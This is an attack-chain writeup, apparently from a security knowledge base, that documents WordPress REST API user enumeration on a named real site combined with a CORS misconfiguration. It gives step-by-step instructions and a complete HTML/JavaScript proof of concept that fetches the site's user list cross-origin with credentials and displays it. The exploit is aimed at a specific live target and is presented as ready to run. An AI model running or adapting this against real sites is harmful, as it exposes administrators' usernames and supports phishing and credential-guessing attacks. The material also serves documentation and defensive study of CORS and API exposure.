---
tags:
  - cors
  - wordpress
  - information-disclosure
  - user-enumeration
type: attack_chain
tools:
  - '[[tools/Browser]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/fetch-users-via-cors-poc]]'
platforms:
  - Web
complexity: low
procedures:
  - '[[procedures/Access-WordPress-REST-API-for-User-Enumeration]]'
  - '[[procedures/Exploit-CORS-Misconfiguration-to-Fetch-User-Data]]'
step_count: 2
techniques:
  - '[[T1087.002]]'
  - '[[Exploit Public-Facing Application]]'
description: >-
  A multi-step attack exploiting CORS misconfiguration and default WordPress
  REST API exposure to enumerate user details including admins without
  authentication.
skill_level: beginner
impact_level: medium
id: 0d2728c3-577b-4411-bafe-0ad815f53aba
created_at: '2025-12-14T17:28:44.972Z'
updated_at: '2025-12-14T17:28:44.972Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[T1087.002]]'
  - '[[Exploit Public-Facing Application]]'
---
# CORS Misconfiguration Leading to Unauthorized User Enumeration on WordPress Site

Multi-stage attack chain demonstrating exploitation of a CORS misconfiguration on a WordPress site's REST API to disclose registered user information, including IDs, names, and usernames, without authentication. This enables reconnaissance for further attacks like phishing or credential guessing targeting admins.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~2 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Direct API Access] --> B[CORS Exploitation]
    B --> C[User Data Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Browser]]

### Target Environment

- Web platform with WordPress
- Exposed REST API endpoint at /wp-json/wp/v2/users/
- No authentication required on the endpoint

### Initial Access Requirements

- Internet access to the target site (e.g., https://mattermost.com)
- No credentials needed
- Browser for executing JavaScript PoC

## Detailed Attack Procedures

### Step 1: Direct API Access for User Enumeration
procedure: [[procedures/Access-WordPress-REST-API-for-User-Enumeration]]

**Objective**: Retrieve the list of registered users via the unauthenticated WordPress REST API endpoint to enumerate IDs, names, and usernames.

**Instructions**: Open a browser and navigate directly to the target endpoint https://mattermost.com/wp-json/wp/v2/users/. The server responds with JSON containing user details due to default WordPress configuration.

**Expected Output**: JSON array of user objects, e.g., {"id":1,"name":"Admin User","slug":"admin",...}.

**Success Indicators**:
- JSON response loads without errors
- User entries including potential admin accounts are visible

### Step 2: Exploit CORS to Fetch User Data Cross-Origin
procedure: [[procedures/Exploit-CORS-Misconfiguration-to-Fetch-User-Data]]

**Objective**: Demonstrate cross-origin access to the user endpoint using JavaScript, bypassing same-origin policy due to permissive CORS headers, to disclose data from any domain.

**Instructions**: Create a local HTML file with the PoC script and load it in a browser from a different origin. Execute [[commands/fetch-users-via-cors-poc]] embedded in the HTML to send a cross-origin request and alert the user data.

```html
<!DOCTYPE html>
<html>
<body>
<div id="demo">Loading...</div>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
  if(this.readyState == 4 && this.status == 200){
    document.getElementById("demo").innerHTML = this.responseText;
    alert(this.responseText);
  }
};
xhr.open("GET", "https://mattermost.com/wp-json/wp/v2/users/", true);
xhr.withCredentials = true;
xhr.send();
</script>
</body>
</html>
```

**Expected Output**: Alert dialog showing the full JSON user list, confirming cross-origin success.

**Success Indicators**:
- Request completes without CORS errors
- User data is displayed or alerted from a non-target origin

## Attack Chain Summary

### Key Achievements

1. Enumerated all registered users including admins without login
2. Demonstrated cross-origin data exfiltration via browser JavaScript
3. Highlighted risks of default WordPress API exposure combined with lax CORS

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[T1087.002]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
